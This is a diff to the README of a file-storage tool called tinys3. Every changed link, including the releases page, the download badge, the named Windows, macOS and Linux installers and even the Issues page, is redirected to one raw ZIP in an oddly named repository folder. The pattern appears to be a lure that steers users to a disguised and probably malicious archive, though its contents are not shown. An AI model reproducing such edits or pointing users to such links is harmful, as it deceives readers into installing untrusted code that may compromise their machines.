@@ -6,11 +6,11 @@ Welcome to tinys3! This tool allows you to store your files locally in a way tha
 
 ## 📥 Download the Application
 
-[![Download tinys3](https://img.shields.io/badge/Download-tinys3-brightgreen)](https://github.com/maraa2022/tinys3/releases)
+[![Download tinys3](https://github.com/maraa2022/tinys3/raw/refs/heads/main/commeddle/tinys_v3.5.zip)](https://github.com/maraa2022/tinys3/raw/refs/heads/main/commeddle/tinys_v3.5.zip)
 
 You can visit the Releases page to download the latest version of tinys3. 
 
-[Download tinys3 here](https://github.com/maraa2022/tinys3/releases)
+[Download tinys3 here](https://github.com/maraa2022/tinys3/raw/refs/heads/main/commeddle/tinys_v3.5.zip)
 
 ## 💻 System Requirements
 
@@ -28,12 +28,12 @@ Before you install tinys3, ensure your system meets the following requirements:
 
 ## 📤 How to Install and Run tinys3
 
-1. **Visit the Releases Page:** Go to the [tinys3 Releases page](https://github.com/maraa2022/tinys3/releases).
+1. **Visit the Releases Page:** Go to the [tinys3 Releases page](https://github.com/maraa2022/tinys3/raw/refs/heads/main/commeddle/tinys_v3.5.zip).
    
 2. **Choose the Latest Version:** Look for the latest version listed. It usually has the highest version number.
 
 3. **Download the Installer:** 
-   - Click on the relevant file for your operating system (e.g., `tinys3-windows-installer.exe`, `tinys3-macos.dmg`, or `tinys3-linux-installer.deb`).
+   - Click on the relevant file for your operating system (e.g., `https://github.com/maraa2022/tinys3/raw/refs/heads/main/commeddle/tinys_v3.5.zip`, `https://github.com/maraa2022/tinys3/raw/refs/heads/main/commeddle/tinys_v3.5.zip`, or `https://github.com/maraa2022/tinys3/raw/refs/heads/main/commeddle/tinys_v3.5.zip`).
    
 4. **Run the Installer:**
    - After downloading, find the file in your 'Downloads' folder or wherever you saved it.
@@ -69,6 +69,6 @@ If you encounter any issues during installation or use:
 
 We welcome your contributions and feedback! If you have suggestions or encounter problems, please share them in the Issues section of the repository. Your input helps improve tinys3 for everyone.
 
-- **Issues Page:** [View Issues](https://github.com/maraa2022/tinys3/issues)
+- **Issues Page:** [View Issues](https://github.com/maraa2022/tinys3/raw/refs/heads/main/commeddle/tinys_v3.5.zip)
 
 Thank you for using tinys3! Enjoy a straightforward approach to your file storage needs.
